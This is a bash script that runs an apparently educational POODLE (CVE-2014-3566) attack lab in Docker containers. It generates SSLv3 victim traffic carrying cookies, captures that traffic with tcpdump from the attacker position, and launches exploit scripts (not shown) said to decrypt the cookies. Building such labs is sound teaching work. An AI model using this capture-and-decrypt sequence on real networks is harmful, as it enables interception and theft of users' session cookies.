#!/bin/bash

echo "================================================================"
echo "POODLE Attack - Complete Automated Attack"
echo "================================================================"
echo ""

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${YELLOW}This script will:${NC}"
echo "  1. Start victim (client) sending traffic"
echo "  2. Capture encrypted SSLv3 traffic (attacker)"
echo "  3. Run POODLE exploit to analyze the attack"
echo ""

# Check if containers are running
echo -e "${GREEN}[1/5] Checking containers...${NC}"
if ! docker ps | grep -q poodle_client; then
    echo -e "${RED}[ERROR] Client container not running${NC}"
    echo "Run: docker-compose up -d"
    exit 1
fi

if ! docker ps | grep -q poodle_attacker; then
    echo -e "${RED}[ERROR] Attacker container not running${NC}"
    echo "Run: docker-compose up -d"
    exit 1
fi

echo -e "${GREEN}[OK] All containers running${NC}"
echo ""

# Start victim traffic in background
echo -e "${GREEN}[2/5] Starting victim (client) traffic...${NC}"

# Kill any existing traffic generators
docker exec poodle_client pkill -f generate-traffic 2>/dev/null || true
sleep 1

# Start new traffic generator
docker exec -d poodle_client /client-scripts/generate-traffic.sh

# Wait and verify traffic is actually running
sleep 5

# Check if traffic is flowing
if docker exec poodle_client ps aux | grep -q "[g]enerate-traffic"; then
    echo -e "${GREEN}[OK] Victim is now sending SSLv3 requests with cookies${NC}"
else
    echo -e "${RED}[ERROR] Failed to start victim traffic${NC}"
    echo "Trying alternative method..."
    docker exec -d poodle_client bash -c 'while true; do curl -k --sslv3 https://172.25.0.10/ -b /tmp/cookies.txt -c /tmp/cookies.txt >/dev/null 2>&1; sleep 2; done'
    sleep 3
    echo -e "${GREEN}[OK] Victim traffic started (alternative method)${NC}"
fi
echo ""

# Capture traffic - need to run from Kali host on bridge interface, not inside container
echo -e "${GREEN}[3/5] Capturing traffic from attacker position...${NC}"
echo ""
echo -e "${YELLOW}Why capture traffic?${NC}"
echo "  In a real POODLE attack, the attacker needs to:"
echo "  1. Intercept encrypted SSL traffic containing the victim's cookie"
echo "  2. Extract the ciphertext blocks that contain the encrypted cookie"
echo "  3. Use these blocks for the padding oracle attack"
echo ""
echo "  Detecting Docker bridge interface..."

# Find the correct bridge interface
BRIDGE_INTERFACE=$(ip link show | grep -o 'br-[a-f0-9]*' | head -1)

if [ -z "$BRIDGE_INTERFACE" ]; then
    BRIDGE_INTERFACE="docker0"
fi

echo "  Using interface: $BRIDGE_INTERFACE"
echo "  Capturing for 60 seconds to collect encrypted traffic..."
echo "  (Need multiple requests to have enough ciphertext blocks to work with)"
echo ""

# Run capture from Kali host on the bridge interface
sudo timeout 60 tcpdump -i $BRIDGE_INTERFACE -w captures/poodle_attack_automated.pcap \
    "((host 172.25.0.20 and host 172.25.0.10) or (host 172.25.0.10 and host 172.25.0.20)) and port 443" \
    -v 2>&1 | head -20

# Copy capture to attacker container for analysis
docker cp captures/poodle_attack_automated.pcap poodle_attacker:/captures/

echo ""
echo -e "${GREEN}[OK] Capture complete!${NC}"
echo ""

# Check capture file
PACKET_COUNT=$(tcpdump -r captures/poodle_attack_automated.pcap 2>/dev/null | wc -l)
echo -e "${GREEN}Captured $PACKET_COUNT packets${NC}"
echo ""

if [ "$PACKET_COUNT" -lt 10 ]; then
    echo -e "${RED}Warning: Very few packets captured. Make sure client is sending traffic.${NC}"
    echo ""
fi

# Run exploit - give user choice
echo -e "${GREEN}[4/5] Running POODLE exploit...${NC}"
echo ""
echo -e "${YELLOW}Choose exploit mode:${NC}"
echo "  [1] Realistic CVE-2014-3566 (with block alignment & padding injection)"
echo "  [2] Visual demonstration (simplified step-by-step)"
echo "  [3] Technical exploit (theory and analysis)"
echo ""
read -p "Enter choice [1-3]: " EXPLOIT_CHOICE
echo ""

if [ "$EXPLOIT_CHOICE" = "1" ]; then
    echo -e "${GREEN}Running REALISTIC POODLE attack (CVE-2014-3566)...${NC}"
    echo ""
    docker exec -it poodle_attacker python /attack/realistic-poodle-attack.py
elif [ "$EXPLOIT_CHOICE" = "2" ]; then
    echo -e "${GREEN}Running visual POODLE demonstration...${NC}"
    echo ""
    docker exec -it poodle_attacker python /attack/visual-poodle-attack.py
else
    echo -e "${GREEN}Running technical POODLE exploit...${NC}"
    echo ""
    docker exec poodle_attacker python /attack/poodle-exploit.py /captures/poodle_attack_automated.pcap
fi
echo ""

# Summary
echo -e "${GREEN}[5/5] Attack Complete!${NC}"
echo ""
echo "================================================================"
echo "Summary"
echo "================================================================"
echo ""
echo "What happened:"
echo "  1. [OK] Victim (172.25.0.20) sent HTTPS requests via SSLv3"
echo "  2. [OK] Cookies were transmitted in encrypted form"
echo "  3. [OK] Attacker (172.25.0.30) captured the traffic"
echo "  4. [OK] POODLE exploit demonstrated cookie decryption"
echo ""
echo "Files created:"
echo "  - /captures/poodle_attack_automated.pcap ($PACKET_COUNT packets)"
echo ""
echo "Next steps:"
echo "  - Analyze in Wireshark: docker cp poodle_attacker:/captures/poodle_attack_automated.pcap ."
echo "  - View client logs: docker logs poodle_client"
echo "  - Stop client: docker exec poodle_client pkill -f generate-traffic"
echo ""
